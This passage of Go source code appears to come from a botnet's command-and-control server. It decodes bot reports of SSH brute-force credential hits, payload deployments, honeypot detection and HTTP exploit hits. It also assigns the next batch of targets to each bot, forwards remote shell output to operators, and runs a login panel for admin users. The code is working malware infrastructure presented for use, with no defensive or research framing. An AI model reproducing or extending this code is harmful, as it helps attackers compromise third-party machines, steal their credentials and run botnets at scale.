		plen := int(binary.BigEndian.Uint16(data[pos+1 : pos+3]))
		pos += 3
		if pos+plen > len(data) {
			break
		}
		p := data[pos : pos+plen]
		pos += plen

		switch msgType {
		case srSSHHit:
			if len(p) < 6 {
				break
			}
			ip := net.IP(p[0:4]).String()
			ulen := int(p[4])
			if 5+ulen+1 > len(p) {
				break
			}
			user := string(p[5 : 5+ulen])
			plenv := int(p[5+ulen])
			if 5+ulen+1+plenv > len(p) {
				break
			}
			pass := string(p[5+ulen+1 : 5+ulen+1+plenv])
			RecordSSHHitNew(ip, user, pass, botID)
			ReportTarget(ip, TargetHit, user+":"+pass)

		case srSSHDeployed:
			if len(p) < 4 {
				break
			}
			ip := net.IP(p[0:4]).String()
			PushActivity("scan", fmt.Sprintf("SSH deployed: %s via %s", ip, botID))

		case srSSHDeployFail:
			if len(p) < 4 {
				break
			}
			ip := net.IP(p[0:4]).String()
			PushActivity("scan", fmt.Sprintf("SSH deploy failed: %s via %s", ip, botID))

		case srSSHProgress:
			if len(p) < 8 {
				break
			}
			cur := binary.BigEndian.Uint32(p[0:4])
			tot := binary.BigEndian.Uint32(p[4:8])
			UpdateBotScanProgress(botID, fmt.Sprintf("%d/%d", cur, tot))

		case srSSHDone:
			if len(p) < 10 {
				break
			}
			total := binary.BigEndian.Uint32(p[0:4])
			skipped := binary.BigEndian.Uint16(p[4:6])
			honeypots := binary.BigEndian.Uint16(p[6:8])
			hpotsProbe := binary.BigEndian.Uint16(p[8:10])

			FlushBotResults(botID)
			PushActivity("scan", fmt.Sprintf("SSH complete on %s: %d targets (skip=%d hp=%d hp_probe=%d)",
				botID, total, skipped, honeypots, hpotsProbe))
			go assignNextBatch(botID, findBotByID(botID))

		case srHTTPHit:
			if len(p) < 6 {
				break
			}
			ip := net.IP(p[0:4]).String()
			status := binary.BigEndian.Uint16(p[4:6])
			statusStr := fmt.Sprintf("%d", status)
			RecordHTTPExploitHitNew(ip, statusStr, botID)
			ReportTarget(ip, TargetHit, statusStr)

		case srHTTPDone:
			if len(p) < 12 {
				break
			}
			total := binary.BigEndian.Uint32(p[0:4])
			misses := binary.BigEndian.Uint32(p[4:8])
			fails := binary.BigEndian.Uint32(p[8:12])

			httpExploitLock.Lock()
			httpExploitRunning = false
			httpExploitLock.Unlock()

			FlushBotResults(botID)
			PushActivity("scan", fmt.Sprintf("HTTP complete on %s: %d targets (miss=%d fail=%d)",
				botID, total, misses, fails))
			go assignNextBatch(botID, findBotByID(botID))
		}
	}
}

// ============================================================================
// CONNECTION I/O UTILITIES
// Helper functions for reading user input from network connections.
// Handle line-based text protocols (Telnet-style) with newline trimming.
// ============================================================================

// getFromConn reads a single line from a network connection (creates new reader)
// Reads until newline delimiter (Telnet-style line input)
// Strips trailing \n and \r for clean string processing
// Creates a new bufio.Reader each call - use getFromConnReader for reuse
func getFromConn(conn net.Conn) (string, error) {
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

// getFromConnReader reads a single line using existing bufio.Reader
// More efficient than getFromConn - reuses reader buffer across reads
// Used in user session loops where multiple inputs are expected
// Strips trailing newlines for clean command parsing
func getFromConnReader(reader *bufio.Reader) (string, error) {
	readString, err := reader.ReadString('\n')
	if err != nil {
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

// forwardBotResponseToUser sends shell command output to the user who requested it
// Formats the output with ANSI colors for visual clarity in terminal
// Includes the bot ID so users know which bot generated the response
// Wraps output in decorative borders for easy reading
// Handles edge case of output not ending with newline
func forwardBotResponseToUser(botID, response string, userConn net.Conn) {
	if response == "" {
		return
	}

	// Send formatted output with colored header and borders
	userConn.Write([]byte(fmt.Sprintf("\033[1;36m[Bot: %s] Shell Output:\r\n", botID)))
	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
	userConn.Write([]byte("\033[0m")) // Reset color for actual output
	userConn.Write([]byte(response))
	if !strings.HasSuffix(response, "\n") {
		userConn.Write([]byte("\r\n"))
	}
	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
	userConn.Write([]byte("\033[0m")) // Reset color after output
}

// authUser handles the login prompt and credential verification for admin users
// Allows up to 3 login attempts before disconnecting (brute force protection)
// Prompts for username and password with styled colored prompts
// Password field uses white-on-white text (hidden) for privacy
// On success, creates client struct and adds to active clients list
// Returns (true, client) on success, (false, nil) on failure
func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {

	// Extract remote IP for rate limiting
	remoteIP := conn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(remoteIP); err == nil {
		remoteIP = host
	}

	// Check if this IP is already blocked from too many failures
	if authIsBlocked(remoteIP) {
		RenderLockout(conn)
		conn.Close()
		return false, nil
	}

	for i := 0; i < 3; i++ { // 3 attempts max
		// Render login banner using ui.go function
		RenderLoginBanner(conn)

		// Attempt counter
		if i > 0 {
			RenderAttemptCounter(conn, i)
		}

		// Input prompts
		RenderInputBox(conn)
		RenderUserPrompt(conn)

		username, err := getFromConnReader(reader)
		if err != nil {
			return false, nil
		}

		RenderPasswordPrompt(conn)

		password, err := getFromConnReader(reader)
		if err != nil {
			return false, nil
		}

		RenderInputBoxClose(conn)

		// Authentication animation
		RenderAuthAnimation(conn)

		if exists, user := AuthUser(username, password); exists {
			authRecordSuccess(remoteIP)
			RenderAccessGranted(conn)
			conn.Write([]byte(ClearScreen))

			loggedClient := &client{
				conn: conn,
				user: *user,
			}
			clientsLock.Lock()
			clients = append(clients, loggedClient)
			clientsLock.Unlock()
			return true, loggedClient
		}

		RenderAccessDenied(conn)
		authRecordFail(remoteIP)
	}

	// Final lockout message
	RenderLockout(conn)
	conn.Close()
	return false, nil
}
